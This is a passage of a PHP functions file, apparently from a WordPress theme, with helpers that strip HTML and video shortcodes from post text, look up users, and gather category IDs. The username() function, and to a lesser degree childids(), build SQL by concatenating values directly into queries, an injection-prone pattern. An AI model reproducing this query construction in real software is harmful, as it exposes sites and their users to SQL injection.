			   $start = 1;
			   }
			   else if($start==1)
			   {
			   if($str[$i]=="<")
			   {
			   $start = 0;
			   $alltext .= " ";
			   }
			   else if(ord($str[$i])>31)
			   {
			   $alltext .= $str[$i];
			   }
			   }
			   }
			   $alltext = str_replace("　"," ",$alltext);
			   $alltext = preg_replace("/&([^;&]*)(;|&)/","",$alltext);
			   $alltext = preg_replace("/[ ]+/s"," ",$alltext);
			   return $alltext;
			   }
function delHtmlContent(){
	global $post, $posts;
	$a = SpHtml2Text($post->post_content);
	return $a; 
	}
function username($user_id){
	global $wpdb;
	$info = $wpdb->get_results("SELECT * FROM $wpdb->users WHERE ID = ".$user_id." ORDER BY ID");
	return $info;
	}
function videoContent(){
	global $post, $posts;
	$a = SpHtml2Text($post->post_content);
	$a = preg_replace('/\[(youku|tudou|56|flash) (id=\"(.*)\"|url=\"(.*)\"|w=\"([0-9]*)\"|h=\"([0-9]*)\")\]/i','',$a);
	return $a; 
	}
	//*********获取当前所属根分类及子分类的所有id**************//
function childids(){
 	 global $wpdb;
	 $categorys = get_the_category();  
      $cat_ida = $categorys[0]->category_parent;//获取当前跟分类id 
      $cat_idb = $categorys[0]->term_id;//获取当前分类id 
      $rootid = $cat_ida==0?$cat_idb:$cat_ida;//根分类的id 
      $sql = 'SELECT wp_terms.term_id FROM`wp_term_taxonomy`
  LEFT JOIN wp_terms ON wp_term_taxonomy.term_id=wp_terms.term_id
  WHERE wp_term_taxonomy.taxonomy="category" and wp_term_taxonomy.parent = '.$rootid.' or wp_term_taxonomy.term_id ='.$rootid;
      $infoarray = $wpdb->get_results($sql); 
      $idarray = array();
      for($i=0;$i<count($infoarray);$i++){ 
           array_push($idarray,$infoarray[$i]->term_id);
          }
      $ids =  implode(',',$idarray);  //获取当前分类下的所有分类目录的id
	  return $ids;
	}
?>